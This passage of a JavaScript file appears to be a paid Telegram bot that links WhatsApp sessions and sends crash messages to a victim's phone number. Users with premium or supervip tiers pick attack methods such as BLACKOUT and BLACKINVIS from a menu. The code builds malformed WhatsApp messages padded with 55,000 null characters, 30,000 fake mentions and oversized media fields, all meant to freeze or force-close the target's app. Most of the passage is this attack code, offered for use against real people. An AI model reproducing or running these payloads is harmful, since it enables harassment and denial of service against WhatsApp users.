                    ephemeralSettingTimestamp: "1728090592378",
                    ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                    externalAdReply: {
                        title: "@ Você foi mencionado",
                        body: "@ Você foi mencionado",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewTtpe: "VIDEO",
                        thumbnail: null,
                        sourceType: " x ",
                        sourceId: " x ",
                        sourceUrl: "https://instagram.com/6u.cg",
                        mediaUrl: "https://instagram.com/6u.cg",
                        containsAutoReply: true,
                        renderLargerThumbnail: true,
                        showAdAttribution: true,
                        ctwaClid: "ctwa_clid_example",
                        ref: "ref_example"
                    },
                    entryPointConversionSource: "entry_point_source_example",
                    entryPointConversionApp: "entry_point_app_example",
                    entryPointConversionDelaySeconds: 5,
                    disappearingMode: {},
                    actionLink: { url: "https://instagram.com/6u.cg" },
                    groupSubject: "Pwq",
                    parentGroupJid: "8888888888888-1234567890@g.us",
                    trustBannerType: "trust_banner_example",
                    trustBannerAction: 1,
                    isSampled: false,
                    utm: { utmSource: "utm_source_example", utmCampaign: "utm_campaign_example" },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "8888888888888-1234567890@g.us",
                        serverMessageId: 1,
                        newsletterName: " X ",
                        contentType: "UPDATE",
                        accessibilityText: "X"
                    },
                    businessMessageForwardInfo: { businessOwnerJid: "0@s.whatsapp.net" },
                    smbClientCampaignId: "smb_client_campaign_id_example",
                    smbServerCampaignId: "smb_server_campaign_id_example",
                    dataSharingContext: { showMmDisclosure: true }
                }
            }
        }, { participant: { jid: jid } }); 
    }
}

async function overbutton(sock, jid, Ptcp = true) {
      await sock.relayMessage(
        jid,
        {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "notblek",
                  format: "EXTENSIONS_1",
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"Èl Hereϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"womp womp\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑‌▾ fuckyu‌${"\u0000".repeat(
                    55000
                  )}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                  version: 3,
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: jid,
              },
            }
          : {}
      );
    }
  
function getUserStatus(userId) {
  const { premium, supervip, owner } = badge(userId);

  if (owner) return owner;
  if (supervip) return supervip;
  if (premium) return premium;
  return "No Access ❌";
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
const BlackThumbalin = "https://i.ibb.co/VYVPX4n8/20250530-060906.jpg";

// Command /start
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const mainCaption = `\`\`\`
情報ドゥヨウノワスアンジン
—々 開発者 : @vDzee
—々 バージョン: 1.2
—々 状態 : 陰毛 
====================
ありがとう
々 𐍃𐌍𐌉𐌕𐌂𐌇  @snitchezs
𝐀𝐥𝐰𝐚𝐲𝐬𝐜߫ά𝐥𝐳𝐳 @alwayscalzz
===================
BUG MENU 
—々 /blackbug
===================
—々 /addbot <ᴘᴀɪʀɪɴɢ>
—々 /setcd <ᴅᴇᴛɪᴋ> 
—々 /grouponly <ᴏɴ/ᴏꜰꜰ>
—々 /listbot
—々 /addsvip <ɪᴅ> <ᴅᴀʏs>
—々 /delsvip <ɪᴅ> <ᴅᴀʏs>
—々 /listsvip 
—々 /addprem <ɪᴅ> <ᴅᴀʏs>
—々 /delprem <ɪᴅ> <ᴅᴀʏs>
—々 /listprem 
===================\`\`\``;
    const keyboard = {
        inline_keyboard: [
            [
                { text: "開発者", url: "https://t.me/vdzee" },
            ]
        ]
    };

    bot.sendPhoto(chatId, BlackThumbalin, {
        caption: mainCaption,
        reply_to_message_id: msg.message_id,
        parse_mode: "Markdown",
        reply_markup: keyboard
    });
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});
const supervipFile = path.resolve("./supervip_users.js");
let supervipUsers = require("./supervip_users.js");

function isSupervip(userId) {
  const user = supervipUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    supervipUsers = supervipUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(supervipFile, `const supervipUsers = ${JSON.stringify(supervipUsers, null, 2)};`);
    return false; 
  }
  return true; 
}

bot.onText(/\/addsvip(?:\s+(\d+))?\s+(\d+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `\`\`\`NO AKSES❌\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, "❗Example: /addsvip <id> <durasi>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const durationDays = parseInt(match[2]);

  if (!newUserId || isNaN(durationDays) || durationDays <= 0) {
    return bot.sendMessage(chatId, "❗ID atau durasi tidak valid.");
  }

  const expirationTime = Date.now() + durationDays * 24 * 60 * 60 * 1000; 

  if (supervipUsers.some(user => user.id === newUserId)) {
    return bot.sendMessage(chatId, "❗User sudah terdaftar sebagai SVIP.");
  }

  supervipUsers.push({ id: newUserId, expiresAt: expirationTime });

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip dengan kedaluwarsa ${durationDays} hari.`
    );
  });
});

bot.onText(/\/delsvip(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 このボットは *グループチャット* でのみ使用できます。', {
  parse_mode: 'Markdown'
});
}
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `\`\`\`NO AKSES❌\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗Example : /delsvip <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");
  const userIndex = supervipUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return bot.sendMessage(chatId, "❗User tidak ditemukan dalam daftar SVIP.");
  }
  supervipUsers.splice(userIndex, 1);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar supervip.`
    );
  });
});

bot.onText(/\/listsvip/, (msg) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 このボットは *グループチャット* でのみ使用できます。', {
  parse_mode: 'Markdown'
});
}
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
`\`\`\`NO AKSES❌\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  const validSupervipUsers = supervipUsers.filter(user => user.expiresAt > Date.now());

  if (!validSupervipUsers.length) {
    return bot.sendMessage(chatId, "📭 Daftar SVIP kosong.");
  }

  const svipList = validSupervipUsers
    .map((user, index) => {
      const expiresAt = new Date(user.expiresAt).toLocaleString();
      return `${index + 1}. ${user.id}\nExpired : ${expiresAt}`;
    })
    .join("\n\n");

  bot.sendMessage(
    chatId,
    ` *LIST SUPER VIP USER :*\n\`\`\`\n${svipList}\n\`\`\``,
    { parse_mode: "Markdown" }
  );
});


const premiumFile = path.resolve("./premium_users.js");
let premiumUsers = require("./premium_users.js");

function isPremium(userId) {
  const user = premiumUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  
  // Cek apakah waktu kedaluwarsa sudah lewat
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    // Hapus pengguna yang kedaluwarsa dari daftar
    premiumUsers = premiumUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(premiumFile, `const premiumUsers = ${JSON.stringify(premiumUsers, null, 2)};`);
    return false;  
  }

  return true; 
}

bot.onText(/\/addprem(?:\s+(.+)\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 このボットは *グループチャット* でのみ使用できます。', {
  parse_mode: 'Markdown'
});
}
  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `\`\`\`NO AKSES❌\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, "❗Example : /addprem <id> <days>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const expirationDays = parseInt(match[2]);

  if (!newUserId || isNaN(expirationDays) || expirationDays <= 0) {
    return bot.sendMessage(chatId, "❗ID atau waktu kedaluwarsa tidak valid.");
  }

  if (premiumUsers.some(user => user.id === newUserId)) {
    return bot.sendMessage(chatId, "❗User sudah premium.");
  }

  const expiresAt = Date.now() + expirationDays * 24 * 60 * 60 * 1000;

  premiumUsers.push({ id: newUserId, expiresAt });

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium dengan waktu kedaluwarsa ${expirationDays} hari.`
    );
  });
});

bot.onText(/\/delprem(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 このボットは *グループチャット* でのみ使用できます。', {
  parse_mode: 'Markdown'
});
}
  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `\`\`\`NO AKSES❌\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗Example : /delprem <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  const userIndex = premiumUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return bot.sendMessage(chatId, "❗User tidak ditemukan di daftar premium.");
  }

  premiumUsers.splice(userIndex, 1);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan data premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 このボットは *グループチャット* でのみ使用できます。', {
  parse_mode: 'Markdown'
});
}
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `\`\`\`NO AKSES❌\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  if (!premiumUsers.length) {
    return bot.sendMessage(chatId, "📭 Daftar pengguna premium kosong.");
  }

  const premiumList = premiumUsers
    .map((user, index) => {
      const expiresAt = new Date(user.expiresAt).toLocaleString();
      return `${index + 1}. ${user.id}\nExpired : ${expiresAt}`;
    })
    .join("\n\n");

  bot.sendMessage(
    chatId,
    `📋 *LIST PREMIUM USER :*\n\`\`\`\n${premiumList}\n\`\`\``,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 このボットは *グループチャット* でのみ使用できます。', {
  parse_mode: 'Markdown'
});
}
  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `\`\`\`NO AKSES❌\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `┃( ! ) BOT ${index} : ${botNumber}\n`;
  botList += `┃( ! ) STATUS : ${status}\n`;
  botList += "┃\n";
  index++;
}
botList += `┃( ! ) TOTAL : ${sessions.size}\n`;
botList += "┕━━━━━━━━━━━━━━━━━━━\n";
botList += "```";
/*START-CONNECT
┃( ! ) STATUS : ⌛
┃( ! ) BOT : ${botNumber}
┕━━━━━━━━━━━━━━━━━━━*/

    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 このボットは *グループチャット* でのみ使用できます。', {
  parse_mode: 'Markdown'
});
}
  // Akses hanya untuk OWNER & SVIP
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `\`\`\`NO AKSES❌\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  // Validasi input
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗️Contoh penggunaan:\n`/addbot 62xxxxxxxxxx`", {
      parse_mode: "Markdown",
    });
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (botNumber.length < 10) {
    return bot.sendMessage(chatId, "❗️Nomor tidak valid.");
  }

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in /addbot:", error);
    bot.sendMessage(
      chatId,
      "⚠️ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/^\/grouponly (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, `\`\`\`NO AKSES❌\`\`\``, {
      parse_mode: "Markdown"
    });
  }

  const state = match[1].toLowerCase();
  settings.groupOnly = state === 'on';

  try {
    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
    bot.sendMessage(chatId, `✅ Mode *Group Only* telah *${settings.groupOnly ? 'AKTIF' : 'NONAKTIF'}*.`, {
      parse_mode: 'Markdown'
    });
  } catch (error) {
    bot.sendMessage(chatId, "❌ Gagal menyimpan pengaturan.", {
      parse_mode: 'Markdown'
    });
    console.error("Gagal menulis settings.json:", error);
  }
});

bot.onText(/^\/grouponly$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  bot.sendMessage(chatId, '❗️Example: /grouponly on');
});

bot.onText(/^\/setcd (\d+)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, `\`\`\`NO AKSES❌\`\`\``, {
      parse_mode: "Markdown"
    });
  }

  const newCd = parseInt(match[1]);
  if (isNaN(newCd) || newCd < 0) {
    return bot.sendMessage(chatId, '⚠️ Masukkan angka yang valid (>= 0).');
  }
  settings.cooldown = newCd;
  try {
    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
    bot.sendMessage(chatId, `✅ Cooldown berhasil diubah menjadi *${newCd} detik*.`, {
      parse_mode: 'Markdown'
    });
  } catch (err) {
    console.error("Gagal menyimpan ke settings.json:", err);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat menyimpan pengaturan.');
  }
});


bot.onText(/^\/setcd$/, (msg) => {
  bot.sendMessage(msg.chat.id, '❗️Example: /setcd 60');
});
bot.onText(/\/blackbug(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
  const fileId = photos.photos[0][0].file_id;
  if (!isPremium(userId) && !isOwner(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "⚠️ 権限がありません.", { parse_mode: "Markdown" });
  }

  const inputNumber = match[1];
  if (!inputNumber) {
    return bot.sendMessage(chatId, "❗️例l: `/blackbug 62xxxx`", { parse_mode: "Markdown" });
  }

  const targetNumber = inputNumber.replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;

  bot.sendPhoto(chatId, fileId, {
   caption: `\`\`\`フウェア機能プ
( ! ) ブラックインヴィス
( ! ) インビジブルX
( ! ) ブラックフォルウェア
( ! ) フォルウェアビレイ 
( ! ) ブラックアルティ
( ! ) すべてのバグを送信
( ! ) 目に見えないフォルウェア機能プライベート
( ! ) [ ${targetNumber} ]
\`\`\``,
    reply_to_message_id: msg.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "見えない", callback_data: `BLACKPROTOCOL_${jid}` },
        ],
        [
          { text: "フォローウェア", callback_data: `BLACKINVIS_${jid}` },
        ],
        [
          { text: "キングブラック", callback_data: `BLACKCOMBO_${jid}` },
        ],
        [
          { text: "ブラックアウト", callback_data: `BLACKOUT_${jid}` },
        ],
        [
          { text: "黒ランダム", callback_data: `BLACKRR_${jid}` },
        ]
      ]
    },
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;

  const [methodKey, jid] = data.split("_");
  const formattedNumber = jid.split("@")[0];
  const username = callbackQuery.from.username || 'Unknown';

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "⚠️ *許可されていません*", { parse_mode: "Markdown" });
  }

  // Daftar metode serangan yang tersedia
  const execute = {
    BLACKPROTOCOL,
    BLACKINVIS,
    BLACKOUT,
    BLACKCOMBO,
    BLACKRR,
  };

  const attackFunction = execute[methodKey];
  if (!attackFunction) {
    return bot.sendMessage(chatId, "❌ メソッドが認識されません");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "⚠️ アクティブな WhatsApp ボットはありません。お願いします /addbot.");
  }

await bot.editMessageCaption(`\`\`\`成功バグ
( ! ) 日付日付 : ${dateTime()}
( ! ) 送信者 : @${username}
( ! ) ボット  : ${sessions.size}
( ! ) ターゲット : ${formattedNumber}
\`\`\``, {
    chat_id: callbackQuery.message.chat.id,
    message_id: callbackQuery.message.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{
          text: "「 チェック 」",
          url: `https://wa.me/${formattedNumber}`
        }],
      ],
    },
  });

  // Eksekusi ke semua sesi
  for (const [botNum, sock] of sessions.entries()) {
    try {
      if (!sock.user) {
        console.log(`${botNum} 準備ができていません。再接続しています...`);
        await initializeWhatsAppConnections();
        continue;
      }

      await attackFunction(sock, jid);
      console.log(`✅ ${methodKey} ボット経由で${formattedNumber}への攻撃が成功しました ${botNum}`);
    } catch (error) {
      console.error(`❌ ${methodKey} の実行中にエラーが発生しました ${formattedNumber}:`, error.message);
    }
  }
});
async function safeExec(label, func) {
  try {
    await func();
  } catch (err) {
    console.error(`Error saat ${label}:`, err.message);
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
//####################################################################
async function protocolbug3(sock, jid, mention) {
    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".Tama Ryuichi" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "Finix",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                    }
                ]
            }
        ]
    });

if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
//####################################################################
async function FCDELAYB(sock, jid, mention) {
let bokepFc = JSON.stringify({
status: true,
criador: "ForceClose",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});

let bokepFcV2 = JSON.stringify({
status: true,
criador: "ForceClose",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: " ",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".SkyzoDevoper",
                                    title: "gtau",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});
const contextInfo = {
mentionedJid: [jid],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
